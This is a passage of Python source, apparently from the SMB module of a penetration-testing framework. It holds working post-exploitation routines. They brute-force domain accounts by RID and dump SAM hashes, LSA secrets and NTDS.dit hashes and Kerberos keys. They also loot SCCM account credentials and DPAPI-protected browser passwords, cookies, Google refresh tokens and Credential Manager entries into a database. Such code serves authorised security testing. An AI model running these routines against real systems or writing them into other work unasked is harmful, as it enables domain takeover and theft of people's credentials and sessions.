            self.logger.fail(f"Error connecting: {e}")
            return entries

        policy_handle = resp["PolicyHandle"]

        try:
            resp = lsad.hLsarQueryInformationPolicy2(dce, policy_handle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
        except lsad.DCERPCException as e:
            if e.error_string == "nca_s_op_rng_error":
                self.logger.fail("RPC lookup failed: RPC method not implemented")
            else:
                self.logger.fail(f"Error querying policy information: {e}")
            return entries

        domain_sid = resp["PolicyInformation"]["PolicyAccountDomainInfo"]["DomainSid"].formatCanonical()

        so_far = 0
        simultaneous = 1000
        for _j in range(max_rid // simultaneous + 1):
            sids_to_check = (max_rid - so_far) % simultaneous if (max_rid - so_far) // simultaneous == 0 else simultaneous

            if sids_to_check == 0:
                break

            sids = [f"{domain_sid}-{i:d}" for i in range(so_far, so_far + sids_to_check)]
            try:
                lsat.hLsarLookupSids(dce, policy_handle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find("STATUS_NONE_MAPPED") >= 0:
                    so_far += simultaneous
                    continue
                elif str(e).find("STATUS_SOME_NOT_MAPPED") >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp["TranslatedNames"]["Names"]):
                if item["Use"] != SID_NAME_USE.SidTypeUnknown:
                    rid = so_far + n
                    domain = resp["ReferencedDomains"]["Domains"][item["DomainIndex"]]["Name"]
                    user = item["Name"]
                    sid_type = SID_NAME_USE.enumItems(item["Use"]).name
                    self.logger.highlight(f"{rid}: {domain}\\{user} ({sid_type})")
                    entries.append(
                        {
                            "rid": rid,
                            "domain": domain,
                            "username": user,
                            "sidtype": sid_type,
                        }
                    )
            so_far += simultaneous
        dce.disconnect()
        return entries

    def put_file_single(self, src, dst):
        self.logger.display(f"Copying {src} to {dst}")
        with open(src, "rb") as file:
            try:
                self.conn.putFile(self.args.share, dst, file.read)
                self.logger.success(f"Created file {src} on \\\\{self.args.share}\\{dst}")
            except Exception as e:
                self.logger.fail(f"Error writing file to share {self.args.share}: {e}")

    def put_file(self):
        for src, dest in self.args.put_file:
            self.put_file_single(src, dest)

    def get_file_single(self, remote_path, download_path):
        share_name = self.args.share
        self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
        if self.args.append_host:
            download_path = f"{self.hostname}-{remote_path}"
        with open(download_path, "wb+") as file:
            try:
                self.conn.getFile(share_name, remote_path, file.write)
                self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
            except Exception as e:
                self.logger.fail(f'Error writing file "{remote_path}" from share "{share_name}": {e}')
                if os.path.getsize(download_path) == 0:
                    os.remove(download_path)

    def get_file(self):
        for src, dest in self.args.get_file:
            self.get_file_single(src, dest)

    def enable_remoteops(self, regsecret=False):
        try:
            if regsecret:
                self.remote_ops = RegSecretsRemoteOperations(self.conn, self.kerberos, self.kdcHost)
            else:
                self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
            self.remote_ops.enableRegistry()
            if self.bootkey is None:
                self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.fail(f"RemoteOperations failed: {e}")

    @requires_admin
    def sam(self):
        try:
            self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
            host_id = self.db.get_hosts(filter_term=self.host)[0][0]

            def add_sam_hash(sam_hash, host_id):
                add_sam_hash.sam_hashes += 1
                self.logger.highlight(sam_hash)
                username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
                self.db.add_credential(
                    "hash",
                    self.hostname,
                    username,
                    f"{lmhash}:{nthash}",
                    pillaged_from=host_id,
                )

            add_sam_hash.sam_hashes = 0

            if self.remote_ops and self.bootkey:
                if self.args.sam == "regdump":
                    SAM = RegSecretsSAMHashes(
                        self.bootkey,
                        remoteOps=self.remote_ops,
                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
                    )
                else:
                    SAM_file_name = self.remote_ops.saveSAM()
                    SAM = SAMHashes(
                        SAM_file_name,
                        self.bootkey,
                        isRemote=True,
                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
                    )

                self.logger.display("Dumping SAM hashes")
                self.output_filename = self.output_file_template.format(output_folder="sam")
                SAM.dump()
                SAM.export(self.output_filename)
                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")

                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")

                if self.args.sam == "secdump":
                    SAM.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
        except Exception as e:
            self.logger.exception(str(e))

    @requires_admin
    def sccm(self):
        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.hostname + "." + self.domain if self.kerberos else self.host,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
        if conn is None:
            self.logger.debug("Could not upgrade connection")
            return

        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False)

        if len(masterkeys) == 0:
            self.logger.fail("No masterkeys looted")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")

        def sccm_callback(secret):
            if isinstance(secret, SCCMCred):
                tag = "NAA Account"
                self.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
                self.db.add_dpapi_secrets(
                    target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.username.decode("latin-1"),
                    secret.password.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMSecret):
                tag = "Task sequences secret"
                self.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
                self.db.add_dpapi_secrets(
                    target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    "N/A",
                    secret.secret.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMCollection):
                tag = "Collection Variable"
                self.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
                self.db.add_dpapi_secrets(
                    target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.variable.decode("latin-1"),
                    secret.value.decode("latin-1"),
                    "N/A",
                )
        try:
            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
            sccm_triage.triage_sccm(use_wmi=self.args.sccm == "wmi", )
        except Exception as e:
            self.logger.debug(f"Error while looting sccm: {e}")

    @requires_admin
    def dpapi(self):
        dump_system = "nosystem" not in self.args.dpapi

        if self.args.pvk is not None:
            try:
                self.pvkbytes = open(self.args.pvk, "rb").read()  # noqa: SIM115
                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
            except Exception as e:
                self.logger.fail(str(e))

        if self.pvkbytes is None:
            self.pvkbytes = get_domain_backup_key(self)

        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.remoteName,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115

        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
        if conn is None:
            self.logger.debug("Could not upgrade connection")
            return

        masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)

        if len(masterkeys) == 0:
            self.logger.fail("No masterkeys looted")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")

        # Collect User and Machine Credentials Manager secrets
        def credential_callback(credential):
            tag = "CREDENTIAL"
            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
            self.logger.highlight(line)
            if self.output_file:
                self.output_file.write(line + "\n")
            self.db.add_dpapi_secrets(
                target.address,
                tag,
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )

        try:
            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
            credentials_triage.triage_credentials()
            if dump_system:
                credentials_triage.triage_system_credentials()
        except Exception as e:
            self.logger.debug(f"Error while looting credentials: {e}")

        dump_cookies = "cookies" in self.args.dpapi

        # Collect Chrome Based Browser stored secrets
        def browser_callback(secret):
            if isinstance(secret, LoginData):
                secret_url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.db.add_dpapi_secrets(
                    target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, GoogleRefreshToken):
                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.db.add_dpapi_secrets(
                    target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.service,
                    secret.token,
                    "Google Refresh Token",
                )
            elif isinstance(secret, Cookie):
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")

        try:
            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
            browser_triage.triage_browsers(gather_cookies=dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting browsers: {e}")

        def vault_callback(secret):
            tag = "IEX"
            if secret.type == "Internet Explorer":
                resource = secret.resource + " -" if secret.resource != "" else "-"
                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.db.add_dpapi_secrets(
                    target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.resource,
                )

        try:
            # Collect User Internet Explorer stored secrets
            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
            vaults_triage.triage_vaults()
        except Exception as e:
            self.logger.debug(f"Error while looting vaults: {e}")

        def firefox_callback(secret):
            tag = "FIREFOX"
            if isinstance(secret, FirefoxData):
                url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.db.add_dpapi_secrets(
                    target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, FirefoxCookie):
                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
                self.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
            firefox_triage.run(gather_cookies=dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting firefox: {e}")

        if self.output_file:
            self.output_file.close()

    @requires_admin
    def list_snapshots(self):
        drive = self.args.list_snapshots

        self.logger.info(f"Retrieving volume shadow copies of drive {drive}.")
        snapshots = self.conn.listSnapshots(self.conn.connectTree(drive), "/")
        if not snapshots:
            self.logger.info("No volume shadow copies found.")
            return
        self.logger.highlight(f"{'Drive':<8}{'Shadow Copies GMT SMB PATH':<26}")
        self.logger.highlight(f"{'------':<8}{'--------------------------':<26}")
        for i in snapshots:
            self.logger.highlight(f"{drive:<8}{i:<26}")

    @requires_admin
    def lsa(self):
        try:
            self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))

            def add_lsa_secret(secret):
                add_lsa_secret.secrets += 1
                self.logger.highlight(secret)
                if "_SC_GMSA_{84A78B8C" in secret:
                    gmsa_id = secret.split("_")[4].split(":")[0]
                    data = bytes.fromhex(secret.split("_")[4].split(":")[1])
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob["CurrentPassword"][:-2]
                    ntlm_hash = MD4.new()
                    ntlm_hash.update(currentPassword)
                    passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")

            add_lsa_secret.secrets = 0

            if self.remote_ops and self.bootkey:
                if self.args.lsa == "regdump":
                    LSA = RegSecretsLSASecrets(
                        self.bootkey,
                        self.remote_ops,
                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                    )
                else:
                    SECURITYFileName = self.remote_ops.saveSECURITY()
                    LSA = LSASecrets(
                        SECURITYFileName,
                        self.bootkey,
                        self.remote_ops,
                        isRemote=True,
                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                    )
                self.logger.display("Dumping LSA secrets")
                self.output_filename = self.output_file_template.format(output_folder="lsa")
                LSA.dumpCachedHashes()
                LSA.exportCached(self.output_filename)
                LSA.dumpSecrets()
                LSA.exportSecrets(self.output_filename)
                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
                if self.args.lsa == "secdump":
                    LSA.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
        except Exception as e:
            self.logger.exception(str(e))

    def ntds(self):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName = None
        host_id = self.db.get_hosts(filter_term=self.host)[0][0]
        printed_kerb_keys_banner = False

        def add_hash(secret_type, secret, host_id):
            nonlocal printed_kerb_keys_banner
            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                self.logger.display("Kerberos keys:")
                printed_kerb_keys_banner = True

            # Count the type of secrets
            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                add_hash.kerb_secrets += 1
            else:
                add_hash.nt_lm_secrets += 1

            # Log the secret based on args
            if self.args.enabled:
                if "Enabled" in secret:
                    secret = " ".join(secret.split(" ")[:-1])
                    self.logger.highlight(secret)
            else:
                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
                self.logger.highlight(secret)

            # Filter out computer accounts, history hashes and kerberos keys for adding to db
            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
                if secret.find("\\") != -1:
                    domain, clean_hash = secret.split("\\")
                else:
                    domain = self.domain
                    clean_hash = secret

                try:
                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                    parsed_hash = f"{lmhash}:{nthash}"
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_hash.added_to_db += 1
                        return
                    raise
                except Exception:
                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                self.logger.debug("Dumped hash is a computer account, not adding to db")

        add_hash.nt_lm_secrets = 0
        add_hash.kerb_secrets = 0
        add_hash.added_to_db = 0

        if self.remote_ops:
            try:
                if self.args.ntds == "vss":
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True
            except Exception as e:
                self.logger.fail(e)

        self.output_filename = self.output_file_template.format(output_folder="ntds")

        NTDS = NTDSHashes(
            NTDSFileName,
            self.bootkey,
            isRemote=True,
            history=self.args.history,
            noLMHash=True,
            remoteOps=self.remote_ops,
            useVSSMethod=use_vss_method,
            justNTLM=not self.args.kerberos_keys,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=self.output_filename,
            justUser=self.args.userntds if self.args.userntds else None,
            printUserStatus=True,
            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
        )

        try:
            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            ntds_outfile = f"{self.output_filename}.ntds"
            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
            if self.args.kerberos_keys:
                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
        except Exception as e:
            # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
            # We don't store the resume file if this error happened, since this error is related to lack
            # of enough privileges to access DRSUAPI.
            #    if resumeFile is not None:
            self.logger.fail(e)
        try:
            self.remote_ops.finish()
        except Exception as e:
            self.logger.debug(f"Error calling remote_ops.finish(): {e}")
        NTDS.finish()

    def mark_guest(self):
        return highlight(f"{highlight('(Guest)')}" if self.is_guest else "")
